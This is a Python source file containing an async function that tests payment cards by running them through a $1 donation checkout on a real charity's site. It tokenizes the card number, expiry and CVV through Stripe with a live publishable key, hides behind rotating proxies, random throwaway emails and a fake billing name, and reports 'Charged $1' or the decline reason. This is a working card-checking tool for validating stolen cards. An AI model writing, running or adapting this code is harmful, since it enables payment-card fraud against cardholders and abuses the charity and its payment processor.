import requests,random,string,time,uuid
from proxy import proxies
import asyncio
def generate_email():
    username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
    domain = random.choice(['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com', 'aol.com', 'icloud.com'])
    return f'{username}@{domain}'

async def stripe_charge3(cc, mm, yy, cvv):
    email = generate_email()
    proxy = proxies()
    r = requests.Session()
    r.proxies = proxy
    headers = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
        'Pragma': 'no-cache',
        'Referer': 'https://actfive.d2.barefootdigital.co/pub/actfive-resident-leaders?bf-preview=1&_mId=9010&version=1.1',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    params = {
        'mode': 'single',
    }

    response = r.get('https://actfive.d2.barefootdigital.co/api/cart', params=params, headers=headers)
    id = response.json().get('id', '')
    cart_id = response.json().get('alt_id', '')
    await asyncio.sleep(1)
    headers = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Origin': 'https://actfive.d2.barefootdigital.co',
        'Pragma': 'no-cache',
        'Referer': 'https://actfive.d2.barefootdigital.co/pub/actfive-resident-leaders?bf-preview=1&_mId=9010&version=1.1',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'cart': '[{"amount":1,"quantity":1,"campaign":"Charitable","appeal":"Donation","motcode":"Resident Leader","e_tracking1":"","e_tracking2":null,"e_tracking3":null,"e_tracking4":null,"product":"SUPPORT_RESIDENTS","description":null,"discount":0}]',
        'mode': 'single',
        'cartData[id]': id,
        'cartData[alt_id]': cart_id,
        'billingInfo[bf-payment-field-email]': email,
        'billingInfo[bf-payment-field-firstname]': 'Albedo',
        'billingInfo[bf-payment-field-lastname]': 'Jones',
        'billingInfo[bf-payment-field-company]': '',
        'billingInfo[bf-payment-field-address]': 'New York',
        'billingInfo[bf-payment-field-address2]': '',
        'billingInfo[bf-payment-field-city]': 'New York',
        'billingInfo[bf-payment-field-province]': 'NY',
        'billingInfo[bf-payment-field-postal]': '10080',
        'billingInfo[bf-payment-field-country]': 'US',
    }

    response = r.put('https://actfive.d2.barefootdigital.co/api/cart', headers=headers, data=data)

    headers = {
        'accept': 'application/json',
        'accept-language': 'en-US',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
    }

    data = {
    'guid': str(uuid.uuid4()),
    'muid': str(uuid.uuid4()),
    'sid': str(uuid.uuid4()),
    'key': 'pk_live_51MZfAnAS6e1ZTxqmquCSb2TyqzDFVJOYfFsIL9yfHvXis8tdBkVACjYxujHMHANOyAFecWhgVN4ixR1Rh1kLEpLR00X4ecfCv8',
    'payment_user_agent': 'stripe.js/78ef418',
    'card[address_line1]': 'New York',
    'card[address_line2]': '',
    'card[address_city]': 'New York',
    'card[address_zip]': '10080',
    'card[name]': 'Albedo Jones',
    'card[exp_month]': mm,
    'card[exp_year]': yy,
    'card[number]': cc,
    'card[cvc]': cvv,
    'card[address_state]': 'NY',
    'card[address_country]': 'US'
    }

    response = r.post('https://api.stripe.com/v1/tokens', headers=headers, data=data).json()
    try:
        tok = response.get('id', '')
        if not tok:
            return 'Invalid Card Number Or Card Expired or Not supported Card'
    except:
        return 'Retry the payment process'
    await asyncio.sleep(1)
    headers = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Origin': 'https://actfive.d2.barefootdigital.co',
        'Pragma': 'no-cache',
        'Referer': 'https://actfive.d2.barefootdigital.co/pub/actfive-resident-leaders?bf-preview=1&_mId=9010&version=1.1',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
    'mode': 'single',
    'amount': '1',
    'currency': 'cad',
    'method': 'credit',
    'addedProcessingFees': '0',
    'isFree': '0',
    'isMonthly': '0',
    'isQuarterly': '0',
    'isSemiAnnual': '0',
    'isAnnual': '0',
    'cart': '[{"amount":1,"quantity":1,"campaign":"Charitable","appeal":"Donation","motcode":"Resident Leader","e_tracking1":"","e_tracking2":null,"e_tracking3":null,"e_tracking4":null,"product":"SUPPORT_RESIDENTS","description":null,"discount":0}]',
    'cartData[id]': id,
    'cartData[alt_id]': cart_id,
    'anonymous': '0',
    'billingInfo[bf-payment-field-email]': email,
    'billingInfo[bf-payment-field-firstname]': 'Albedo',
    'billingInfo[bf-payment-field-lastname]': 'Jones',
    'billingInfo[bf-payment-field-company]': '',
    'billingInfo[bf-payment-field-address]': 'New York',
    'billingInfo[bf-payment-field-address2]': '',
    'billingInfo[bf-payment-field-city]': 'New York',
    'billingInfo[bf-payment-field-province]': 'NY',
    'billingInfo[bf-payment-field-postal]': '10080',
    'billingInfo[bf-payment-field-country]': 'US',
    'instructions': '',
    'orderKey': '',
    'e_int1': 'NaN',
    'e_int2': 'NaN',
    'e_int3': 'NaN',
    'e_int4': 'NaN',
    'e_int5': 'NaN',
    'e_dec1': 'NaN',
    'e_dec2': 'NaN',
    'e_flag1': '0',
    'e_flag2': '0',
    'e_flag3': '0',
    'e_flag4': '0',
    'e_flag5': '0',
    'token': tok
    }

    response = r.post('https://actfive.d2.barefootdigital.co/api/order', headers=headers, data=data)
    try:
        if response.status_code != 200:
            try:
                response_json = response.json()
                if 'errors' in response_json and isinstance(response_json['errors'], list):
                    if 'message' in response_json['errors'][0]:
                        msg = response_json['errors'][0]['message']
                        return msg
                elif '"thankyou":"Thank You!' in response.text:
                    return 'Charged $1'
                else:
                    return f'Unknown error occurred {response.text}'
            except ValueError:
                return f'Unknown error occurred {response.text}'
        elif response.status_code == 200:
            return 'Charged $1'
        else:
            return f'Unhandled response {response.text}'
    except Exception as e:
        return f'An exception occurred: {str(e)}'

